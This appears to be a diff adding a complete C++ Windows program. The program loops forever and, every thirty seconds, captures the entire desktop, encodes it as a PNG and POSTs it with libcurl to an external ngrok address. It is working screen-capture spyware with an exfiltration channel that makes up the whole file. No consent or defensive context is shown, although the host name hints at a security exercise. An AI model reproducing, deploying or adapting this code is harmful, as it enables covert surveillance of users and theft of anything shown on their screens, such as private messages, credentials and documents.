@@ -1,0 +1,185 @@
+#include <curl/curl.h>
+#include <sstream>
+#include <stdio.h>
+#include <string>
+#include <windows.h>
+#include <wininet.h>
+#include <winuser.h>
+#include <conio.h>
+#include <time.h>
+#include <fstream>
+#include <strsafe.h>
+#include <io.h>
+#include <crtdefs.h>
+#include <GdiPlus.h>
+#include <lmcons.h>
+#include <vector>
+#include <iostream>
+
+using namespace Gdiplus;
+using namespace std;
+
+#pragma comment(lib, "user32.lib") 
+#pragma comment(lib,"Wininet.lib")
+#pragma comment (lib,"gdiplus.lib")
+
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
+{
+    UINT  num = 0;
+    UINT  size = 0;
+    ImageCodecInfo* pImageCodecInfo = NULL;
+    GetImageEncodersSize(&num, &size);
+    if (size == 0)
+        return -1;
+    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
+    if (pImageCodecInfo == NULL)
+        return -1;
+    GetImageEncoders(num, size, pImageCodecInfo);
+    for (UINT j = 0; j < num; ++j)
+    {
+        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
+        {
+            *pClsid = pImageCodecInfo[j].Clsid;
+            free(pImageCodecInfo);
+            return j;
+        }
+    }
+    free(pImageCodecInfo);
+    return -1;
+}
+
+std::vector<BYTE> BitmapToBytes(Bitmap* bm) {
+    if (bm == nullptr || bm->GetLastStatus() != Status::Ok) {
+        std::cout << "Bitmap is not in a valid state" << std::endl;
+        return std::vector<BYTE>();
+    }
+
+    IStream* stream = nullptr;
+    HRESULT hr = CreateStreamOnHGlobal(NULL, TRUE, &stream);
+    if (FAILED(hr)) {
+        std::cout << "Failed to create stream" << std::endl;
+        return std::vector<BYTE>();
+    }
+
+    // Use the EncoderParameters structure and the Image::Save method to save an image with multiple frames
+    CLSID pngClsid;
+    GetEncoderClsid(L"image/png", &pngClsid);
+    EncoderParameters encoderParameters;
+    encoderParameters.Count = 1;
+    encoderParameters.Parameter[0].Guid = EncoderSaveFlag;
+    encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
+    encoderParameters.Parameter[0].NumberOfValues = 1;
+
+    LONG value = EncoderValueFlush;
+    encoderParameters.Parameter[0].Value = &value;
+
+    if (bm->Save(stream, &pngClsid, &encoderParameters) != Status::Ok) {
+        std::cout << "Failed to save bitmap, status: " << bm->GetLastStatus() << std::endl;
+        if (stream) stream->Release();
+        return std::vector<BYTE>();
+    }
+
+    STATSTG stat;
+    HRESULT hr_stat = stream->Stat(&stat, STATFLAG_NONAME);
+    if (FAILED(hr_stat)) {
+        std::cout << "Failed to get stream stats" << std::endl;
+        if (stream) stream->Release();
+        return std::vector<BYTE>();
+    }
+
+    ULONG size = stat.cbSize.LowPart;
+    std::vector<BYTE> bytes(size);
+
+    LARGE_INTEGER zero = { 0 };
+    stream->Seek(zero, STREAM_SEEK_SET, nullptr);
+
+    ULONG bytesRead;
+    HRESULT hr_read = stream->Read(bytes.data(), size, &bytesRead);
+    if (FAILED(hr_read)) {
+        std::cout << "Failed to read from stream" << std::endl;
+        if (stream) stream->Release();
+        return std::vector<BYTE>();
+    }
+
+    stream->Release();
+
+    return bytes;
+}
+
+
+void send_data(const std::vector<BYTE>& data, const std::string& url) {
+    CURL* curl;
+    CURLcode res;
+
+    struct curl_slist* headers = NULL;
+    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
+
+    curl_global_init(CURL_GLOBAL_ALL);
+
+    curl = curl_easy_init();
+    if (curl) {
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.data());
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, data.size());
+        res = curl_easy_perform(curl);
+        if (res != CURLE_OK)
+            fprintf(stderr, "curl_easy_perform() failed: %s\n",
+                curl_easy_strerror(res));
+        curl_easy_cleanup(curl);
+    }
+
+    curl_slist_free_all(headers);
+
+    curl_global_cleanup();
+}
+
+void screenshot() {
+    ULONG_PTR gdiplustoken;
+    GdiplusStartupInput gdistartupinput;
+    GdiplusStartupOutput gdistartupoutput;
+    gdistartupinput.SuppressBackgroundThread = true;
+    GdiplusStartup(&gdiplustoken, &gdistartupinput, &gdistartupoutput);
+
+    HDC dc = GetDC(GetDesktopWindow());
+    HDC dc2 = CreateCompatibleDC(dc);
+    RECT rc0kno;
+    GetClientRect(GetDesktopWindow(), &rc0kno);
+    int w = rc0kno.right - rc0kno.left;
+    int h = rc0kno.bottom - rc0kno.top;
+    HBITMAP hbitmap = CreateCompatibleBitmap(dc, w, h);
+    if (hbitmap == NULL) {
+        std::cout << "Failed to create HBITMAP" << std::endl;
+        return;
+    }
+
+    HBITMAP holdbitmap = (HBITMAP)SelectObject(dc2, hbitmap);
+    BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);
+    SelectObject(dc2, holdbitmap);
+
+    Bitmap* bm = new Bitmap(hbitmap, NULL);
+    if (bm->GetLastStatus() != Status::Ok) {
+        std::cout << "Failed to create bitmap, status: " << bm->GetLastStatus() << std::endl;
+        return;
+    }
+
+    std::vector<BYTE> data = BitmapToBytes(bm);
+    if (!data.empty()) {
+        send_data(data, "https://cybersecurity.ngrok.dev");
+    }
+
+    DeleteDC(dc2); // Replace DeleteObject with DeleteDC
+    DeleteObject(hbitmap);
+    ReleaseDC(GetDesktopWindow(), dc);
+    GdiplusShutdown(gdiplustoken);
+}
+
+
+
+int main()
+{
+    while (true) {
+        screenshot();
+        Sleep(1000 * 30 * 1);
+    }
+}
